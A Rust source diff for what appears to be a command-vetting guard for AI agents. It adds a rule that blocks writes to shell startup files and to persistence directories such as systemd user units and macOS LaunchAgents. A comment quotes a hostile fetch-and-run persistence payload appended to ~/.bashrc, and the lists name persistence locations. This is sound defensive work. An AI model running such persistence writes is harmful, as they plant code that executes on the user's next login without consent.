@@ -208,6 +208,9 @@ fn classify_script_with_depth(script: &Script, depth: usize) -> Decision {
         if let Some(reason) = m2_staged_payload_to_exec_target(pipeline) {
             return Decision::Deny { reason };
         }
+        if let Some(reason) = persistence_write_to_shell_startup(pipeline) {
+            return Decision::Deny { reason };
+        }
         if let Some(reason) = m2_git_hard_deny(pipeline) {
             return Decision::Deny { reason };
         }
@@ -915,10 +918,35 @@ fn is_exec_target(path: &str) -> bool {
 
 /// Shell rc / profile files. Writing to these is execution-class:
 /// the next interactive shell launch will source them.
+///
+/// 1.2.0 adversarial review (Claude H-4) added fish configs and the
+/// `inputrc` family to close persistence paths that weren't in the
+/// 1.0.0 set.
 static SHELL_RC_FILES: phf::Set<&'static str> = phf::phf_set! {
     ".bashrc", ".zshrc", ".profile", ".bash_profile", ".bash_login",
     ".zshenv", ".zprofile", ".zlogin",
+    // fish — config.fish / fish_variables. Detection is by basename
+    // so anything at `~/.config/fish/config.fish` matches.
+    "config.fish", "fish_variables",
+    // readline config — `~/.inputrc` sourced by every readline-linked
+    // shell; `preexec`/`precmd` hooks can live in fish_prompt.fish
+    // but those aren't universal so we only gate the canonical names.
+    ".inputrc",
 };
+
+/// Path-substring markers for persistence-class write targets that
+/// are NOT identifiable by basename alone. Writes containing any of
+/// these as a path component are denied. 1.2.0 adversarial review
+/// (Claude H-4 + GPT HIGH #4): missing these was a persistence hole.
+static PERSISTENCE_PATH_MARKERS: &[&str] = &[
+    "/etc/profile.d/",        // sourced by every login shell (if writable)
+    "/.config/fish/",         // fish config dir
+    "/.config/systemd/user/", // per-user systemd units
+    "/.local/share/systemd/user/",
+    "/.config/autostart/",    // xdg autostart .desktop files
+    "/Library/LaunchAgents/", // macOS per-user launch agents
+    "/Library/LaunchDaemons/",
+];
 
 // ---------------------------------------------------------------------
 // M2 — secret-exfil, env-dump-exfil, reverse-shell, git split.
@@ -1229,6 +1257,60 @@ fn m2_staged_payload_to_exec_target(pipeline: &Pipeline) -> Option<String> {
         }
     }
     None
+}
+
+/// Deny any write to a shell rc / login file or a known persistence
+/// directory, regardless of payload content.
+///
+/// 1.2.0 adversarial review (Claude S5/S6 + GPT HIGH #4): the existing
+/// `m2_staged_payload_to_exec_target` only fires when the written
+/// payload itself contains an exfil shape (secret + net tool, env
+/// dump + net tool, `/dev/tcp`). A persistence payload like
+/// `echo "curl x | sh" >> ~/.bashrc` has none of those tokens in
+/// isolation, so m2 misses it. But any agent-initiated write to a
+/// shellrc is suspicious by construction — the next interactive
+/// shell will execute whatever was written. Deny by path shape.
+///
+/// Includes plain-redirect writes (`echo ... > ~/.bashrc`) AND
+/// heredoc writes (`cat > ~/.bashrc <<EOF`); both are captured because
+/// the parser's `effective_out_file_target` + argv-based `tee/dd/cp`
+/// output target cover both forms.
+fn persistence_write_to_shell_startup(pipeline: &Pipeline) -> Option<String> {
+    for stage in &pipeline.stages {
+        let out_target = effective_out_file_target(stage).or_else(|| argv_output_target(stage));
+        let Some(target) = out_target else { continue };
+        if is_persistence_target(&target) {
+            return Some(format!(
+                "blocked: write to shell-startup / persistence path \
+                 `{t}` — next login or service start would execute \
+                 this content (persistence-class)",
+                t = sanitize_reason_text(&target),
+            ));
+        }
+    }
+    None
+}
+
+/// Is `path` a shell-startup file, or under a persistence-class dir?
+fn is_persistence_target(path: &str) -> bool {
+    let trimmed = path.trim().trim_end_matches('/');
+    if trimmed.is_empty() {
+        return false;
+    }
+    // Basename match for shell-rc files.
+    let base = trimmed.rsplit('/').next().unwrap_or(trimmed);
+    if SHELL_RC_FILES.contains(base) {
+        return true;
+    }
+    // Substring match for dir-based persistence markers. Case-sensitive
+    // — macOS paths like `/Library/LaunchAgents/` retain their case;
+    // a lowercase variant would be a different path.
+    for marker in PERSISTENCE_PATH_MARKERS {
+        if trimmed.contains(marker) {
+            return true;
+        }
+    }
+    false
 }
 
 /// Scan a string that's being written to an exec target for exfil
